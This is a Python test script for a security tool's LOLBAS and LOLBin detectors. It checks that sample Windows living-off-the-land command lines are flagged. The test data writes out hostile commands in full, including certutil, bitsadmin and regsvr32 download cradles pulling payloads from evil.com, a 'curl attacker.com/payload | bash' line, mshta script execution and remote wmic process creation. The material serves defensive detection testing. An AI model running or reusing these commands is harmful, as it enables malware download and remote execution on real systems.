# LOLBAS Feed & Pattern Database Coverage
# Detected by:
#   LolbinDetector  (data/lolbas_patterns.json)  — Layer 3 built-in patterns
#   LolbasDetector  (intel/lolbas.json)           — Layer 4 LOLBAS feed fuzzy match
# MITRE: T1218, T1105, T1197, T1202, T1127
# ---------------------------------------------------------------
# Tests binaries that ARE in the live intel/lolbas.json feed but are NOT
# in the BUILTIN_PATTERNS list — these exercise Layer 4 (fuzzy token matching)
# exclusively. Also validates LolbinDetector against data/lolbas_patterns.json.
#
# Safe — check_process() and check() are pure in-memory lookups; no
# processes are spawned.

import os
import sys
import json

ROOT = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, ROOT)

from modules.lolbas_detector import LolbasDetector
from modules.lolbin_detector  import LolbinDetector

print("[*] TEST 6: LOLBAS Feed & Pattern Database Coverage")
print(f"[*] PID: {os.getpid()}")
print()

# ─────────────────────────────────────────────────────────────────
# PART A — LolbasDetector: Layer 4 LOLBAS feed fuzzy token matching
#           intel/lolbas.json
# ─────────────────────────────────────────────────────────────────
print("═" * 65)
print("  PART A — LolbasDetector (intel/lolbas.json) Layer 4 feed match")
print("═" * 65)
print("[*] Loading LolbasDetector (reads intel/lolbas.json) ...")

lolbas_det = LolbasDetector()

# These binaries are in intel/lolbas.json but NOT in BUILTIN_PATTERNS —
# so detection must come entirely from the LOLBAS feed (Layer 4).
# Each command replicates a real abuse-pattern token sequence.
LOLBAS_FEED_TESTS = [
    {
        "name": "AddinUtil.exe — proxy execution via Addins.Store (T1218)",
        "process_name": "AddinUtil.exe",
        "exe_path":     r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe",
        "cmdline":      r"AddinUtil.exe -AddinRoot:C:\malicious\payload",
        "parent":       "winword.exe",
    },
    {
        "name": "CertReq.exe — remote certificate request download cradle (T1105)",
        "process_name": "CertReq.exe",
        "exe_path":     r"C:\Windows\System32\certreq.exe",
        "cmdline":      r"certreq.exe -Post -config http://192.168.1.100/evil C:\Windows\Temp\out.txt",
        "parent":       "explorer.exe",
    },
    {
        "name": "Bash.exe — WSL shell escape to bypass AppLocker (T1218)",
        "process_name": "bash.exe",
        "exe_path":     r"C:\Windows\System32\bash.exe",
        "cmdline":      r"bash.exe -c 'curl http://attacker.com/payload | bash'",
        "parent":       "cmd.exe",
    },
    {
        "name": "Cmdkey.exe — credential store enumeration (T1555)",
        "process_name": "cmdkey.exe",
        "exe_path":     r"C:\Windows\System32\cmdkey.exe",
        "cmdline":      r"cmdkey.exe /list",
        "parent":       "powershell.exe",
    },
    {
        "name": "BITSAdmin.exe — stealthy BITS download (T1197) [BUILTIN]",
        "process_name": "bitsadmin.exe",
        "exe_path":     r"C:\Windows\System32\bitsadmin.exe",
        "cmdline":      r'bitsadmin.exe /transfer job /download /priority normal http://evil.com/rat.exe C:\Windows\Temp\rat.exe',
        "parent":       "explorer.exe",
    },
]

passed_a = 0
for t in LOLBAS_FEED_TESTS:
    finding = lolbas_det.check_process(
        process_name=t["process_name"],
        cmdline=t["cmdline"],
        exe_path=t["exe_path"],
        parent_name=t["parent"],
    )
    detected = finding is not None
    status   = "[+] DETECTED" if detected else "[-] MISSED  "
    outcome  = "PASS" if detected else "FAIL"
    print(f"\n  {status}  {t['name']}")
    if detected:
        print(f"             MITRE      : {finding['mitre']}")
        print(f"             Confidence : {finding['confidence']}")
        print(f"             Source     : {finding.get('detection_source', finding.get('source', '?'))}")
        print(f"             → {outcome}")
        passed_a += 1
    else:
        print(f"             → {outcome}  (check intel/lolbas.json feed coverage)")

print()
print(f"[*] Part A: {passed_a}/{len(LOLBAS_FEED_TESTS)} detections — "
      f"{'OK' if passed_a >= len(LOLBAS_FEED_TESTS) - 1 else 'review intel/lolbas.json feed'}")

# ─────────────────────────────────────────────────────────────────
# PART B — LolbinDetector: data/lolbas_patterns.json pattern file
# ─────────────────────────────────────────────────────────────────
print()
print("═" * 65)
print("  PART B — LolbinDetector (data/lolbas_patterns.json) patterns")
print("═" * 65)
print("[*] Loading LolbinDetector (reads data/lolbas_patterns.json) ...")

lolbin_det = LolbinDetector()

PATTERN_FILE_TESTS = [
    {
        "name":    "certutil.exe — URL-cache download cradle (T1105)",
        "process": "certutil.exe",
        "cmdline": "certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\Windows\\Temp\\payload.exe",
    },
    {
        "name":    "mshta.exe — remote VBScript execution (T1218.005)",
        "process": "mshta.exe",
        "cmdline": "mshta.exe vbscript:close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run('cmd')\"))",
    },
    {
        "name":    "regsvr32.exe — Squiblydoo COM scriptlet (T1218.010)",
        "process": "regsvr32.exe",
        "cmdline": "regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll",
    },
    {
        "name":    "bitsadmin.exe — BITS stealthy download (T1197)",
        "process": "bitsadmin.exe",
        "cmdline": "bitsadmin.exe /transfer myJob /download /priority high http://192.168.0.5/mal.exe C:\\Temp\\mal.exe",
    },
    {
        "name":    "wmic.exe — remote WMI process creation (T1047)",
        "process": "wmic.exe",
        "cmdline": r"wmic.exe /node:192.168.1.50 process call create 'cmd.exe /c whoami'",
    },
    {
        "name":    "svchost.exe — NOT in patterns (should not fire)",
        "process": "svchost.exe",
        "cmdline": "svchost.exe -k netsvcs",
        "expect_miss": True,
    },
]

passed_b = 0
for t in PATTERN_FILE_TESTS:
    expect_miss = t.get("expect_miss", False)
    alert = lolbin_det.check(
        process_name=t["process"],
        command_line=t["cmdline"],
    )
    detected = alert is not None
    if expect_miss:
        ok = not detected
        status = "[-] CLEAN   " if ok else "[!] FALSE+  "
        outcome = "PASS" if ok else "FAIL (false positive)"
    else:
        ok = detected
        status = "[+] DETECTED" if ok else "[-] MISSED  "
        outcome = "PASS" if ok else "FAIL"

    print(f"\n  {status}  {t['name']}")
    if detected and not expect_miss:
        print(f"             MITRE   : {alert.mitre}")
        print(f"             Matched : {alert.matched_args}")
        print(f"             → {outcome}")
    else:
        print(f"             → {outcome}")

    if ok:
        passed_b += 1

print()
total = len(PATTERN_FILE_TESTS)
print(f"[*] Part B: {passed_b}/{total} passed — "
      f"{'OK' if passed_b == total else 'check data/lolbas_patterns.json'}")

# ─────────────────────────────────────────────────────────────────
# SUMMARY
# ─────────────────────────────────────────────────────────────────
print()
print("═" * 65)
all_pass = (passed_a >= len(LOLBAS_FEED_TESTS) - 1) and (passed_b == len(PATTERN_FILE_TESTS))
if all_pass:
    print("[✓] TEST 6 PASSED — both threat intel files are active and functional.")
else:
    print("[✗] TEST 6 had failures — see details above.")
    print("    → Run Intel Update in the GUI to refresh intel/lolbas.json.")
    print("    → Ensure data/lolbas_patterns.json exists and is valid JSON.")
print("═" * 65)
